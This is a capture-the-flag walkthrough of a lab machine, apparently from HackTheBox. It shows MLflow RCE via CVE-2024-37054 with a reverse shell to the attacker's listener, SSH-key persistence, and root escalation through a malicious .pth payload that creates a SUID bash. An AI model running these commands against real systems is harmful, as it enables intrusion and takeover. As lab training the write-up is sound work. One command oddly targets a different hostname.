# SmartHire

> **Difficulty:** Medium  
> **Operating System:** Linux

---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.129.245.215

echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts

```

![](images/Pasted%20image%2020260807165941.png)

The scan reveals two open ports:

- **22 (SSH)**
    
- **80 (HTTP)**
    

As usual, we start by enumerating the web application for hidden directories and virtual hosts.

The directory busting comes back almost empty-handed:

```bash
gobuster dir -u http://smarthire.htb \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

```

![](images/Pasted%20image%2020260807171739.png)

However, virtual host enumeration is much more interesting. It reveals a subdomain called **models.smarthire.htb**.

```bash
gobuster vhost -u https://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

![](images/Pasted%20image%2020260807171825.png)

We add the newly discovered subdomain to `/etc/hosts` so that we can access it from our machine.

Heading over to the main website, nothing immediately catches our attention.

![](images/Pasted%20image%2020260808192329.png)

so we register an account and start digging deeper into the application's functionality.

![](images/Pasted%20image%2020260807171941.png)

![](images/Pasted%20image%2020260807172010.png)

We notice that the application allows us to upload **CSV files** in two different places:

- **Train Model**
- **Make Prediction**

That immediately becomes interesting because file uploads are always worth investigating, especially when the uploaded file is later processed by another service.

Keeping that in mind, we move over to the newly discovered `models.smarthire.htb` subdomain. 
However, it requires authentication.

![](images/Pasted%20image%2020260808180042.png)

### Discovering the MLflow Service

To gather more information about the service, we run **Nikto**:

```bash
nikto -h  http://models.smarthire.htb 

```

![](images/Pasted%20image%2020260808180253.png)

Nikto reveals that the service has a default account for **`mlflow`**.

Using those credentials, we are able to access the web interface.

The first thing that catches our eye is the version number displayed in the top-left corner: **MLflow 2.14.1**.
![](images/Pasted%20image%2020260808180428.png)

A quick Google search shows that this version is affected by multiple CVEs.

![](images/Pasted%20image%2020260808180804.png)

At first, we try searching for a PoC based directly on the CVE numbers returned by Google, but we don't get anywhere.

This is a good reminder that vulnerability research shouldn't always be limited to searching for a specific CVE. Searching more broadly for things such as:

- `mlflow rce`
- `mlflow 2.14.1 rce`
- `mlflow 2.14

can sometimes lead to working research or PoCs that don't immediately appear when searching by CVE alone.

In our case, this leads us to **CVE-2024-37054**, a critical deserialization vulnerability in MLflow that can lead to **Remote Code Execution (RCE)**.

Interestingly, this CVE wasn't mentioned in our initial search results.

![](images/Pasted%20image%2020260808181326.png)

After testing the available PoCs, we determine that the second one works.

The exploit we used can be found here:

[MLflow Pickle RCE PoC](https://github.com/RampsOnly/mlflow-pickle-rce/blob/main/mlflow-exploit.py?utm_source=chatgpt.com)

### Exploiting MLflow

After downloading the exploit and reading its `README.md`, we learn that the attack requires us to first upload a model and obtain its **Model ID**.

We then use the exploit to modify that model so that malicious code is executed when the model is used for prediction.

This fits perfectly with the functionality we discovered earlier on the main website, where we can both **train a model** and later **make a prediction** using a CSV file.

First, we prepare the two CSV files.

The first one is the file that will eventually trigger the exploit:

```bash
echo 'experience,skills
60,"Python, SQL"' > clean.csv

```

The second file is our legitimate training data:

```bash
#create the file
nano training_data.csv

#then paste the text underneath
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise Inc

```

We upload `training_data.csv` through the **Train Model** functionality.

![](images/Pasted%20image%2020260808182311.png)

Once the model is trained, the application gives us a **Model ID**.

We copy this ID because we will need it when running the exploit.

At the same time, we open the **Make Predictions** page in another tab. You can simply right-click the link and choose **Open link in new tab**.

### Preparing the Exploit

Before running the exploit, we create a Python virtual environment and install the required dependencies:

```bash
#1
python3 -m venv .venv
#2
source  .venv/bin/activate
#3
python -m pip install --upgrade pip
python -m pip install mlflow requests


```

![](images/Pasted%20image%2020260808183150.png)

Now we run the exploit:

```bash
# change the ip and the model's id
python3 mlflow-exploit.py -t http://models.smarthire.htb -l YOUR_IP -p 4444 -u admin -P password --model YOUR_MODEL_IP

```

![](images/Pasted%20image%2020260808183235.png)

The exploit prepares the malicious model, but we still need to trigger its execution.

So we open a listener on port **4444**:

```bash
nc -lvnp 4444

```

We then return to the **Make Predictions** page we opened earlier and upload `clean.csv`.

![](images/Pasted%20image%2020260808183421.png)

After clicking **Analyse Resume**, the application processes our malicious model.

And voila — we receive our reverse shell.

![](images/Pasted%20image%2020260808183508.png)

### Getting a Stable SSH Session

As always, we first retrieve the user flag:

```bash
cd ~
cat user.txt

```

![](images/Pasted%20image%2020260808183604.png)

Since the reverse shell is a bit messy, we upgrade it to a more usable interactive shell:

```bash
#1
script /dev/null -c bash
#2 Ctrl + z
#3
stty raw -echo;fg
#4 Enter

```

![](images/Pasted%20image%2020260808184652.png)

While enumerating the user's home directory, we notice that it contains an **`.ssh/authorized_keys`** file.

Since SSH was already identified as an open service during our initial Nmap scan, we can use this to make our access more reliable by adding our own public SSH key.

First, on our machine, we generate an RSA key pair:

```bash
#On our machine
ssh-keygen -t rsa -b 4096 -f key -N ""
# then we do
chmod 600 key
# and we paste the key.pub file into .ssh/authorized_keys by copying the output of:
cat key.pub

```

![](images/Pasted%20image%2020260808184016.png)

We copy the output of `cat key.pub` and append it to the target user's `.ssh/authorized_keys`.

![](images/Pasted%20image%2020260808184816.png)

We can then log in directly through SSH:

```bash
ssh -i key svcweb@smarthire.htb

```

![](images/Pasted%20image%2020260808184915.png)

Now we have a stable SSH session as **svcweb**.

---

# Privilege Escalation

As I mention often in my writeups, one of the first commands in the privilege-escalation checklist should be:

```bash
sudo -l

```

And surprisingly, this immediately gives us a clue about the path toward root.

![](images/Pasted%20image%2020260808185059.png)

### Investigating the Sudo Permission

The output tells us that we can execute a Python script with elevated privileges.

So, naturally, the next step is to inspect the script:

```bash
ll /opt/tools/mlflow_ctl/mlflowctl.py

# if ll isn't working just do:
alias ll='ls -la'
```

![](images/Pasted%20image%2020260808185659.png)

The script is **owned by root**, but it is readable by other users.

Let's see what it actually does:

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py

```

![](images/Pasted%20image%2020260808190405.png)

The following part immediately catches our attention:

```python
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

```

The script first locates its `plugins` directory and then loops through each subdirectory inside it.

For every directory it finds, it calls:

```python
site.addsitedir(str(path))
```

**This is where things get interesting.**

`site.addsitedir()` does more than simply add a directory to Python's module search path.

It also processes **`.pth` files** found inside that directory.

A `.pth` file can normally be used to add additional directories to Python's import path. However, `.pth` files can also contain lines beginning with `import`.

Those import statements are executed when Python processes the `.pth` file, meaning that arbitrary Python code can be executed during interpreter initialization.

This behavior itself is **not a vulnerability**. It is legitimate Python functionality.

The problem here is the way the application is using it.

The script is running with **root privileges**, and it automatically processes `.pth` files from its plugin directories. Therefore, if a low-privileged user can **write to one of those plugin directories**, they can potentially create a malicious `.pth` file containing Python code.

When the root-owned script is executed, Python processes that file and executes our code with **root privileges**.

We check the permissions:

```bash
ll /opt/tools/mlflow_ctl/plugins/*

```

![](images/Pasted%20image%2020260808190938.png)

And there it is.

The `/dev` directory inside the plugins directory is writable by members of the **`devs`** group.

Now we check which groups our current user belongs to.

![](images/Pasted%20image%2020260808191100.png)

**BINGO!**

Our user belongs to the `devs` group, meaning we have write access to the directory that the root-owned Python script will process.

At this point, the privilege escalation path is clear:

1. Create a malicious `.pth` file inside the writable plugin directory.
2. Put Python code inside it that executes with root privileges.
3. Run the root-owned Python script through `sudo`.
4. The Python interpreter processes our `.pth` file.
5. Our code executes as root.

### Exploiting the Writable Plugin Directory

We create the malicious `.pth` file:

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")' > /opt/tools/mlflow_ctl/plugins/dev/root.pth
```

The payload copies `/bin/bash` to `/tmp/rootbash` and sets the **SUID** bit on the copied binary.

This means that when we execute `/tmp/rootbash`, it will run with the privileges of its owner — **root**.

Now we trigger the vulnerable behavior by running the root-owned script with `sudo`:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

![](images/Pasted%20image%2020260808191619.png)

Finally, we execute our SUID-enabled Bash binary with the `-p` option:

```bash
/tmp/rootbash -p 
```

And voila — **ROOT SHELL!**

We can now retrieve the system flag:

```bash
cat /root/root.txt

```

---

## Conclusion

This was an interesting machine that required a bit more enumeration than usual to get the foothold.

The privilege escalation was the highlight for me. 
It introduced a nice Python-specific attack path where the problem wasn't really a vulnerable function, but rather **how a root process trusted a writable plugin directory**.

The `.pth` file behavior and `site.addsitedir()` were definitely worth learning, and it's a good reminder that small implementation details can become serious privilege-escalation vectors when combined with writable paths and `sudo`.

**— 0xchnk**